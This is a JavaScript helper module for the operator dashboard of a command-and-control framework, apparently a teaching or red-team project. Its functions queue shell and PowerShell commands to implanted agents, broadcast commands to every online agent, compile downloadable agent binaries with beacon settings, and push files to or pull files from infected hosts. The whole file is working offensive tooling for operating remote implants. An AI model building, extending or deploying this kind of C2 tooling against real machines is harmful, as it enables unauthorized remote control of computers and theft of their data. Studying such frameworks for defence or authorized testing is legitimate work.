/**
 * C2 server API helpers — matches Rust server routes in server/src/main.rs
 * Server runs at https://localhost:3443 (see scripts/queue-command.sh)
 */

/** Base URL for REST calls; Vite dev proxies /api → :3443 */
export function getApiBase() {
  if (import.meta.env.VITE_C2_API_URL) {
    return import.meta.env.VITE_C2_API_URL.replace(/\/$/, '');
  }
  if (typeof window !== 'undefined' && window.location.port === '5173') {
    return '';
  }
  return typeof window !== 'undefined' ? window.location.origin : '';
}

/** WebSocket URL for dashboard live events */
export function getWsUrl() {
  if (import.meta.env.VITE_C2_WS_URL) {
    return import.meta.env.VITE_C2_WS_URL;
  }
  if (typeof window === 'undefined') return 'ws://localhost:3443/api/dashboard/ws';

  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  if (window.location.port === '5173') {
    return `${protocol}//${window.location.hostname}:5173/api/dashboard/ws`;
  }
  return `${protocol}//${window.location.host}/api/dashboard/ws`;
}

/** Default C2 server URL for agent builds */
export function getDefaultServerUrl() {
  if (import.meta.env.VITE_C2_API_URL) {
    return import.meta.env.VITE_C2_API_URL.replace(/\/$/, '');
  }
  if (typeof window !== 'undefined' && window.location.port === '5173') {
    return 'https://localhost:3443';
  }
  return typeof window !== 'undefined' ? window.location.origin : 'https://localhost:3443';
}

/** Generate a random PSK for educational agent builds */
export function generatePsk() {
  const bytes = crypto.getRandomValues(new Uint8Array(16));
  return Array.from(bytes, (b) => b.toString(16).padStart(2, '0')).join('');
}

/**
 * Queue a shell command for an agent (delivered on next beacon).
 * POST /api/command/queue
 */
export async function queueAgentCommand(agentId, payload, commandType = 'shell') {
  const res = await fetch(`${getApiBase()}/api/command/queue`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      agent_id: agentId,
      command_type: commandType,
      payload,
    }),
  });

  if (!res.ok) {
    const text = await res.text().catch(() => res.statusText);
    throw new Error(text || `Failed to queue command (${res.status})`);
  }

  return res.json();
}

/** POST /api/command/broadcast */
export async function broadcastCommand(command, filters = {}, commandType = 'shell') {
  const res = await fetch(`${getApiBase()}/api/command/broadcast`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      command,
      command_type: commandType,
      filters: {
        os: filters.os ?? [],
        status: filters.status ?? ['online'],
      },
    }),
  });

  if (!res.ok) {
    const text = await res.text().catch(() => res.statusText);
    throw new Error(text || `Broadcast failed (${res.status})`);
  }

  return res.json();
}

/** GET /api/command/broadcast/history */
export async function fetchBroadcastHistory() {
  const res = await fetch(`${getApiBase()}/api/command/broadcast/history`);
  if (!res.ok) throw new Error(`Failed to fetch broadcast history (${res.status})`);
  const data = await res.json();
  return Array.isArray(data) ? data : [];
}

/** GET /api/agents/:id/results */
export async function fetchAgentResults(agentId) {
  const res = await fetch(`${getApiBase()}/api/agents/${agentId}/results`);
  if (!res.ok) throw new Error(`Failed to fetch results (${res.status})`);
  return res.json();
}

/** GET /api/payloads/sessions */
export async function fetchPayloadSessions() {
  const res = await fetch(`${getApiBase()}/api/payloads/sessions`);
  if (!res.ok) throw new Error(`Failed to fetch payload sessions (${res.status})`);
  const data = await res.json();
  return Array.isArray(data) ? data : [];
}

/** POST /api/agents/build */
export async function buildAgent({ targetOs, serverUrl, psk, beaconInterval }) {
  const res = await fetch(`${getApiBase()}/api/agents/build`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      target_os: targetOs,
      server_url: serverUrl,
      psk,
      beacon_interval: beaconInterval,
    }),
  });

  if (!res.ok) {
    const text = await res.text().catch(() => res.statusText);
    throw new Error(text || `Build failed (${res.status})`);
  }

  return res.json();
}

/** GET /api/agents/builds */
export async function fetchAgentBuilds() {
  const res = await fetch(`${getApiBase()}/api/agents/builds`);
  if (!res.ok) throw new Error(`Failed to fetch builds (${res.status})`);
  const data = await res.json();
  return Array.isArray(data) ? data : [];
}

/** Download compiled agent binary */
export function getAgentDownloadUrl(buildId) {
  return `${getApiBase()}/api/agents/download/${buildId}`;
}

/** POST /api/files/upload/:agentId — send file to agent */
export function uploadFileToAgent(agentId, file, destPath, onProgress) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    const formData = new FormData();
    formData.append('file', file);
    if (destPath) formData.append('dest_path', destPath);

    xhr.upload.addEventListener('progress', (e) => {
      if (e.lengthComputable && onProgress) {
        onProgress(Math.round((e.loaded / e.total) * 100));
      }
    });

    xhr.addEventListener('load', () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        try {
          resolve(JSON.parse(xhr.responseText));
        } catch {
          reject(new Error('Invalid server response'));
        }
      } else {
        reject(new Error(xhr.responseText || `Upload failed (${xhr.status})`));
      }
    });

    xhr.addEventListener('error', () => reject(new Error('Network error during upload')));
    xhr.open('POST', `${getApiBase()}/api/files/upload/${agentId}`);
    xhr.send(formData);
  });
}

/** POST /api/files/download/:agentId — request file from agent */
export async function downloadFileFromAgent(agentId, filePath) {
  const res = await fetch(`${getApiBase()}/api/files/download/${agentId}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ file_path: filePath }),
  });

  if (!res.ok) {
    const text = await res.text().catch(() => res.statusText);
    throw new Error(text || `Download request failed (${res.status})`);
  }

  return res.json();
}

/** GET /api/files/:transferId */
export async function fetchTransferStatus(transferId) {
  const res = await fetch(`${getApiBase()}/api/files/${transferId}`);
  if (!res.ok) throw new Error(`Failed to fetch transfer (${res.status})`);
  return res.json();
}

/** GET /api/files/agent/:agentId */
export async function fetchAgentTransfers(agentId) {
  const res = await fetch(`${getApiBase()}/api/files/agent/${agentId}`);
  if (!res.ok) throw new Error(`Failed to fetch transfers (${res.status})`);
  const data = await res.json();
  return Array.isArray(data) ? data : [];
}

/**
 * POST /api/payloads/upload (multipart)
 * @param {File} file
 * @param {(pct: number) => void} [onProgress]
 */
export function uploadPayload(file, onProgress) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    const formData = new FormData();
    formData.append('file', file);

    xhr.upload.addEventListener('progress', (e) => {
      if (e.lengthComputable && onProgress) {
        onProgress(Math.round((e.loaded / e.total) * 100));
      }
    });

    xhr.addEventListener('load', () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        try {
          resolve(JSON.parse(xhr.responseText));
        } catch {
          reject(new Error('Invalid server response'));
        }
      } else {
        reject(new Error(xhr.responseText || `Upload failed (${xhr.status})`));
      }
    });

    xhr.addEventListener('error', () => reject(new Error('Network error during upload')));
    xhr.open('POST', `${getApiBase()}/api/payloads/upload`);
    xhr.send(formData);
  });
}

/** Pick command_type based on agent OS (matches agent/src/main.rs handlers) */
export function resolveCommandType(agent, command) {
  const trimmed = command.trim().toLowerCase();
  if (trimmed.startsWith('powershell ') || trimmed === 'powershell') {
    return { commandType: 'powershell', payload: command.replace(/^powershell\s+/i, '') };
  }
  if (trimmed.startsWith('sleep ')) {
    return { commandType: 'sleep', payload: trimmed.replace(/^sleep\s+/, '') };
  }
  const os = (agent?.os ?? '').toLowerCase();
  if (os.includes('windows')) {
    return { commandType: 'shell', payload: command };
  }
  return { commandType: 'shell', payload: command };
}

/** Format relative time for last-seen display */
export function formatRelativeTime(isoString) {
  if (!isoString) return 'never';
  const diff = Date.now() - new Date(isoString).getTime();
  const secs = Math.floor(diff / 1000);
  if (secs < 60) return `${secs}s ago`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}m ago`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}h ago`;
  return `${Math.floor(hours / 24)}d ago`;
}

/** Local-only help text (not sent to C2 server) */
export function getLocalHelpText(agent) {
  const os = (agent?.os ?? '').toLowerCase();
  const shellHint = os.includes('windows')
    ? 'shell commands run via cmd /C'
    : 'shell commands run via sh -c';

  return [
    'C2 Session CLI — commands are queued via POST /api/command/queue',
    'Delivery happens on the agent\'s next HTTPS beacon.',
    '',
    'Local commands:',
    '  help              — show this message',
    '',
    'Queued on agent (real execution):',
    '  whoami            — shell: whoami',
    '  dir / ls          — list directory',
    '  hostname          — show hostname',
    '  sleep 5           — agent sleeps 5 seconds',
    `  powershell ...    — Windows PowerShell (${shellHint})`,
    '',
    'Anything else is sent as a shell command to the selected agent.',
  ].join('\n');
}
